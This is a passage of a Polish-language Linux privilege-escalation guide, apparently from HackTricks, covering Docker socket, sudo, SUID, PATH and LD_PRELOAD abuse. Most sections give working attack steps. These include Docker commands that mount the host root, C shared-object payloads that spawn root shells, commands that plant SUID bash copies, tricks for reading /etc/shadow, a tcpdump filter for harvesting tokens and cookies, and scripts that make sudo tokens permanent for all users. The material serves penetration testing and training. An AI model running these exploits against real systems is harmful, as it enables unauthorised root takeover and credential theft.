Jeśli **zidentyfikujesz jakikolwiek writable socket** (_teraz mówimy o Unix Sockets i nie o plikach konfiguracyjnych `.socket`_), to **możesz komunikować się** z tym socketem i być może wykorzystać lukę.

### Wypisywanie Unix Sockets
```bash
netstat -a -p --unix
```
### Surowe połączenie
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Przykład eksploatacji:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Zauważ, że mogą istnieć pewne **sockets nasłuchujące żądań HTTP** (_Nie mówię o .socket files, lecz o plikach działających jako unix sockets_). Możesz to sprawdzić za pomocą:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Jeśli socket **odpowiada na żądania HTTP**, możesz z nim **komunikować się** i być może **wykorzystać jakąś lukę**.

### Zapisowalny Docker socket

Docker socket, często znajdujący się pod `/var/run/docker.sock`, to krytyczny zasób, który powinien być zabezpieczony. Domyślnie jest zapisywalny przez użytkownika `root` i członków grupy `docker`. Posiadanie uprawnień zapisu do tego socketu może prowadzić do eskalacji uprawnień. Poniżej opisano, jak można to zrobić oraz alternatywne metody, jeśli Docker CLI nie jest dostępne.

#### **Privilege Escalation with Docker CLI**

Jeśli masz dostęp zapisu do Docker socket, możesz eskalować uprawnienia, używając następujących poleceń:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Te polecenia pozwalają uruchomić container z dostępem root do systemu plików hosta.

#### **Używanie Docker API bezpośrednio**

W przypadkach, gdy Docker CLI nie jest dostępny, Docker socket nadal można manipulować za pomocą Docker API i poleceń `curl`.

1.  **List Docker Images:** Pobierz listę dostępnych obrazów.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Wyślij żądanie utworzenia containera, który montuje katalog root systemu hosta.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Użyj `socat`, aby nawiązać połączenie z containerem, umożliwiając wykonywanie poleceń w jego wnętrzu.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Po nawiązaniu połączenia `socat` możesz wykonywać polecenia bezpośrednio w containerze z dostępem root do systemu plików hosta.

### Others

Zauważ, że jeśli masz uprawnienia zapisu do docker socket ponieważ jesteś **inside the group `docker`** masz [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Jeśli [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from containers or abuse container runtimes to escalate privileges** in:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany **inter-Process Communication (IPC) system**, który umożliwia aplikacjom efektywną interakcję i wymianę danych. Zaprojektowany z myślą o nowoczesnym systemie Linux, oferuje solidne ramy dla różnych form komunikacji między aplikacjami.

System jest wszechstronny — obsługuje podstawowe IPC, które usprawnia wymianę danych między procesami, przypominając **enhanced UNIX domain sockets**. Ponadto pomaga w broadcastowaniu zdarzeń lub sygnałów, ułatwiając płynną integrację między komponentami systemu. Na przykład sygnał od demona Bluetooth o nadchodzącym połączeniu może spowodować wyciszenie odtwarzacza muzyki, poprawiając doświadczenie użytkownika. Dodatkowo D-Bus obsługuje system zdalnych obiektów, upraszczający żądania usług i wywołania metod między aplikacjami, usprawniając procesy, które tradycyjnie były złożone.

D-Bus działa na zasadzie **allow/deny model**, zarządzając uprawnieniami wiadomości (wywołania metod, emisje sygnałów itp.) na podstawie skumulowanego efektu pasujących reguł polityki. Te polityki określają interakcje z bus, potencjalnie umożliwiając privilege escalation poprzez wykorzystanie tych uprawnień.

Przykład takiej polityki w `/etc/dbus-1/system.d/wpa_supplicant.conf` pokazano, opisujący uprawnienia dla użytkownika root do posiadania, wysyłania i odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy mają zastosowanie uniwersalnie, podczas gdy polityki w kontekście "default" dotyczą wszystkich, którzy nie są objęci innymi, bardziej specyficznymi politykami.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się tutaj, jak enumerate i exploit komunikację D-Bus:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Zawsze warto enumerate sieć i ustalić pozycję maszyny.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Szybkie triage filtrowania wychodzącego

Jeśli na hoście można uruchamiać polecenia, ale callbacks zawodzą, szybko rozdziel filtrowanie DNS, transportu, proxy i trasowania:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Otwarte porty

Zawsze sprawdź usługi sieciowe działające na maszynie, z którymi nie mogłeś wejść w interakcję przed uzyskaniem do niej dostępu:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Sklasyfikuj listeners według bind target:

- `0.0.0.0` / `[::]`: dostępne na wszystkich lokalnych interfejsach.
- `127.0.0.1` / `::1`: tylko lokalne (good tunnel/forward candidates).
- Konkretne wewnętrzne adresy IP (np. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): zwykle osiągalne tylko z segmentów wewnętrznych.

### Procedura triage usług dostępnych tylko lokalnie

Gdy przejmiesz hosta, usługi nasłuchujące na `127.0.0.1` często stają się po raz pierwszy osiągalne z poziomu twojego shell. Szybki lokalny workflow to:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS jako skaner sieciowy (network-only mode)

Poza lokalnymi PE checks, linPEAS może działać jako ukierunkowany skaner sieciowy. Wykorzystuje dostępne binarki w `$PATH` (zazwyczaj `fping`, `ping`, `nc`, `ncat`) i nie instaluje tooling.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Jeśli przekażesz `-d`, `-p` lub `-i` bez `-t`, linPEAS zachowuje się jak czysty network scanner (pomijając resztę privilege-escalation checks).

### Sniffing

Sprawdź, czy możesz sniff traffic. Jeśli tak, możesz być w stanie grab some credentials.
```
timeout 1 tcpdump
```
Szybkie praktyczne kontrole:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) jest szczególnie przydatny w post-exploitation, ponieważ wiele usług dostępnych tylko wewnętrznie ujawnia tam tokens/cookies/credentials:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Przechwyć teraz, parsuj później:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Użytkownicy

### Generic Enumeration

Sprawdź, **kim** jesteś, jakie masz **uprawnienia**, którzy **użytkownicy** są w systemie, którzy mogą się **zalogować** i którzy mają **uprawnienia root**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Duży UID

Niektóre wersje Linuxa były podatne na błąd, który pozwala użytkownikom z **UID > INT_MAX** na escalate privileges. Więcej informacji: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy jesteś **członkiem jakiejś grupy**, która mogłaby przyznać Ci root privileges:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Schowek

Sprawdź, czy w schowku znajdują się jakieś interesujące informacje (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka haseł
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Znane hasła

Jeśli **znasz jakiekolwiek hasło** do środowiska **spróbuj zalogować się jako każdy użytkownik** używając tego hasła.

### Su Brute

Jeśli nie przeszkadza Ci generowanie dużego hałasu i na komputerze dostępne są binarki `su` i `timeout`, możesz spróbować przeprowadzić brute-force na użytkownikach używając [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` również próbuje przeprowadzić brute-force na użytkownikach.

## Nadużycia zapisywalnego PATH

### $PATH

Jeśli stwierdzisz, że możesz **zapisywać w jakimś katalogu należącym do $PATH**, możesz być w stanie eskalować uprawnienia poprzez **utworzenie backdoora w zapisywalnym katalogu** o nazwie pewnego polecenia, które zostanie uruchomione przez innego użytkownika (najlepiej root) i które **nie jest ładowane z katalogu znajdującego się wcześniej** w $PATH niż twój zapisywalny katalog.

### SUDO and SUID

Możesz mieć pozwolenie na uruchomienie pewnych poleceń za pomocą sudo lub pliki mogą mieć ustawiony bit suid. Sprawdź to używając:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają na odczyt i/lub zapis plików, a nawet wykonanie polecenia.** Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracja sudo może pozwolić użytkownikowi uruchomić pewne polecenie z uprawnieniami innego użytkownika bez znajomości hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchamiać `vim` jako `root`; teraz uzyskanie powłoki jest trywialne — można dodać klucz ssh do katalogu root lub wywołać `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ta dyrektywa pozwala użytkownikowi **ustawić zmienną środowiskową** podczas wykonywania czegoś:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ten przykład, **oparty na HTB machine Admirer**, był **podatny** na **PYTHONPATH hijacking**, co pozwalało załadować dowolną bibliotekę python podczas uruchamiania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV zachowany przez sudo env_keep → root shell

Jeśli sudoers zachowuje `BASH_ENV` (np. `Defaults env_keep+="ENV BASH_ENV"`), możesz wykorzystać nieinteraktywne zachowanie startowe Basha, aby uruchomić dowolny kod jako root podczas wywoływania dozwolonego polecenia.

- Dlaczego to działa: Dla powłok nieinteraktywnych Bash ocenia `$BASH_ENV` i wczytuje ten plik przed uruchomieniem docelowego skryptu. Wiele reguł sudo pozwala na uruchomienie skryptu lub wrappera powłoki. Jeśli `BASH_ENV` jest zachowany przez sudo, twój plik zostanie wczytany z uprawnieniami roota.

- Wymagania:
- Reguła sudo, którą możesz uruchomić (dowolny cel, który wywołuje `/bin/bash` nieinteraktywnie, lub dowolny skrypt bash).
- `BASH_ENV` obecny w `env_keep` (sprawdź za pomocą `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Usuń `BASH_ENV` (i `ENV`) z `env_keep`, preferuj `env_reset`.
- Unikaj wrapperów shell dla poleceń dozwolonych przez sudo; używaj minimalnych binarek.
- Rozważ logowanie I/O sudo i alertowanie, gdy używane są zachowane zmienne środowiskowe.

### Terraform przez sudo z zachowanym HOME (!env_reset)

Jeśli sudo pozostawia środowisko nienaruszone (`!env_reset`) podczas gdy pozwala na `terraform apply`, `$HOME` pozostaje katalogiem użytkownika wywołującego. Terraform w związku z tym ładuje **$HOME/.terraformrc** jako root i respektuje `provider_installation.dev_overrides`.

- Wskaż wymagany provider na zapisywalny katalog i umieść złośliwy plugin nazwany jak provider (np. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform nie przejdzie Go plugin handshake, ale wykona payload jako root zanim zakończy działanie, pozostawiając SUID shell.

### TF_VAR nadpisania + obejście walidacji symlinków

Zmienne Terraform mogą być przekazane za pomocą zmiennych środowiskowych `TF_VAR_<name>`, które przetrwają, gdy sudo zachowa środowisko. Słabe walidacje, takie jak `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, można obejść za pomocą symlinków:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform rozwiązuje symlink i kopiuje rzeczywisty `/root/root.txt` do lokalizacji czytelnej dla atakującego. Ten sam sposób można wykorzystać do **zapisu** w uprzywilejowanych ścieżkach przez uprzednie utworzenie docelowych symlinków (np. wskazujących ścieżkę docelową providera wewnątrz `/etc/cron.d/`).

### requiretty / !requiretty

W niektórych starszych dystrybucjach sudo może być skonfigurowane z `requiretty`, co wymusza uruchamianie sudo tylko z interaktywnego TTY. Jeśli `!requiretty` jest ustawione (lub opcja jest nieobecna), sudo może być wykonywane w kontekstach nieinteraktywnych, takich jak reverse shells, cron jobs lub skrypty.
```bash
Defaults !requiretty
```
To nie jest bezpośrednia podatność sama w sobie, ale rozszerza sytuacje, w których reguły sudo mogą być nadużyte bez potrzeby uzyskania pełnego PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Jeśli `sudo -l` pokaże `env_keep+=PATH` lub `secure_path` zawierający wpisy zapisywalne przez atakującego (np. `/home/<user>/bin`), dowolna komenda wywołana bez ścieżki absolutnej wewnątrz celu dozwolonego przez sudo może zostać podmieniona.

- Wymagania: reguła sudo (często `NOPASSWD`) uruchamiająca skrypt/binarny, który wywołuje polecenia bez ścieżek absolutnych (`free`, `df`, `ps`, itp.) oraz zapisowalny wpis w PATH, który jest przeszukiwany jako pierwszy.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Omijanie ścieżek wykonywania Sudo
**Przejdź**, aby przeczytać inne pliki lub użyć **symlinks**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeśli użyty jest **wildcard** (\*), jest to jeszcze łatwiejsze:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez ścieżki do polecenia

Jeśli **uprawnienie sudo** jest przyznane pojedynczemu poleceniu **bez określenia ścieżki**: _hacker10 ALL= (root) less_ można to wykorzystać, zmieniając zmienną PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ta technika może być również użyta, jeśli **suid** binary **wykonuje inne polecenie bez podania jego ścieżki (zawsze sprawdź zawartość dziwnej SUID binary za pomocą** _**strings**_ **)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary z podaną ścieżką polecenia

Jeśli **suid** binary **wykonuje inne polecenie określając ścieżkę**, możesz spróbować **wyeksportować funkcję** nazwaną tak jak polecenie, które wywołuje plik suid.

Na przykład, jeśli suid binary wywołuje _**/usr/sbin/service apache2 start**_, musisz spróbować stworzyć funkcję i ją wyeksportować:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Następnie, gdy wywołasz suid binary, ta funkcja zostanie wykonana

### Skrypt zapisywalny wykonywany przez SUID wrapper

Częstą niewłaściwą konfiguracją custom-app jest root-owned SUID binary wrapper, który uruchamia skrypt, podczas gdy sam skrypt jest zapisywalny przez użytkowników low-priv.

Typowy wzorzec:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Jeśli `/usr/local/bin/backup.sh` jest zapisywalny, możesz dopisać payload commands, a następnie uruchomić SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Szybkie kontrole:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Ta ścieżka ataku jest szczególnie powszechna w wrapperach "maintenance"/"backup" dostarczanych w `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Zmienna środowiskowa **LD_PRELOAD** służy do określenia jednej lub więcej bibliotek współdzielonych (pliki .so), które loader załaduje przed wszystkimi innymi, w tym przed standardową biblioteką C (`libc.so`). Ten proces jest znany jako wstępne załadowanie biblioteki.

Aby jednak zachować bezpieczeństwo systemu i zapobiec wykorzystaniu tej funkcji, szczególnie w przypadku plików wykonywalnych **suid/sgid**, system narzuca pewne warunki:

- Loader ignoruje **LD_PRELOAD** dla plików wykonywalnych, w których rzeczywisty identyfikator użytkownika (_ruid_) nie zgadza się z efektywnym identyfikatorem użytkownika (_euid_).
- Dla plików wykonywalnych z **suid/sgid**, wstępnie ładowane są tylko biblioteki znajdujące się w standardowych ścieżkach, które również mają **suid/sgid**.

Eskalacja uprawnień może wystąpić, jeśli masz możliwość uruchamiania poleceń za pomocą `sudo` i wynik `sudo -l` zawiera instrukcję **env_keep+=LD_PRELOAD**. Ta konfiguracja pozwala, aby zmienna środowiskowa **LD_PRELOAD** była zachowana i rozpoznawana nawet podczas uruchamiania poleceń z użyciem `sudo`, co może prowadzić do wykonania dowolnego kodu z podwyższonymi uprawnieniami.
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Następnie **skompiluj to** używając:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na koniec, **escalate privileges** uruchamiając
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Podobny privesc może być wykorzystany, jeśli atakujący kontroluje zmienną środowiskową **LD_LIBRARY_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Gdy natrafisz na binarkę z uprawnieniami **SUID**, która wydaje się nietypowa, dobrą praktyką jest sprawdzenie, czy poprawnie ładuje pliki **.so**. Można to sprawdzić, uruchamiając następujące polecenie:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład, napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeruje możliwość wykorzystania.

Aby to wykorzystać, należałoby utworzyć plik C, powiedzmy _"/path/to/.config/libcalc.c"_, zawierający następujący kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i uruchomieniu, ma na celu podniesienie uprawnień poprzez manipulowanie uprawnieniami plików i uruchomienie shell z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do pliku shared object (.so) za pomocą:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Wreszcie uruchomienie podatnego pliku binarnego SUID powinno wywołać exploit, umożliwiając potencjalne przejęcie systemu.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Teraz, gdy znaleźliśmy SUID binary, który ładuje bibliotekę z folderu, do którego mamy prawa zapisu, stwórzmy bibliotekę w tym folderze o wymaganej nazwie:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli otrzymasz błąd taki jak
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to oznacza, że biblioteka, którą wygenerowałeś, musi zawierać funkcję o nazwie `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to skatalogowana lista binarek Unix, które mogą zostać wykorzystane przez atakującego do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) to to samo, ale dla przypadków, gdy możesz **tylko wstrzykiwać argumenty** w polecenie.

Projekt zbiera legalne funkcje binarek Unix, które mogą być nadużyte do ucieczki z ograniczonych shelli, eskalacji lub utrzymania podwyższonych uprawnień, transferu plików, uruchamiania bind and reverse shells oraz ułatwiania innych post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Jeśli możesz uruchomić `sudo -l` możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), aby sprawdzić, czy znajdzie sposób na wykorzystanie którejkolwiek reguły sudo.

### Reusing Sudo Tokens

W przypadkach, gdy masz **sudo access** ale nie znasz hasła, możesz eskalować uprawnienia, **czekając na wykonanie polecenia sudo i przechwytując token sesji**.

Wymagania do eskalacji uprawnień:

- Masz już shell jako użytkownik "_sampleuser_"
- "_sampleuser_" użył **`sudo`** do wykonania czegoś w **ostatnich 15 minutach** (domyślnie to czas trwania tokena sudo, który pozwala używać `sudo` bez wprowadzania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` ma wartość 0
- `gdb` jest dostępny (możesz go przesłać)

(Możesz tymczasowo włączyć `ptrace_scope` poleceniem `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub na stałe modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli wszystkie te wymagania są spełnione, **możesz eskalować uprawnienia używając:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) utworzy binarkę `activate_sudo_token` w _/tmp_. Możesz jej użyć, aby **aktywować token sudo w swojej sesji** (nie otrzymasz automatycznie root shell, wykonaj `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Drugi **exploit** (`exploit_v2.sh`) utworzy sh shell w _/tmp_ **który będzie należeć do root i mieć ustawiony setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **trzeci exploit** (`exploit_v3.sh`) **utworzy plik sudoers**, który sprawi, że **sudo tokens będą wieczne i pozwoli wszystkim użytkownikom korzystać z sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Jeśli masz **uprawnienia do zapisu** w folderze lub na którymkolwiek z plików utworzonych wewnątrz tego folderu, możesz użyć binarki [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) aby **utworzyć token sudo dla użytkownika i PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz shell jako ten użytkownik z PID 1234, możesz **uzyskać uprawnienia sudo** bez konieczności znajomości hasła wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

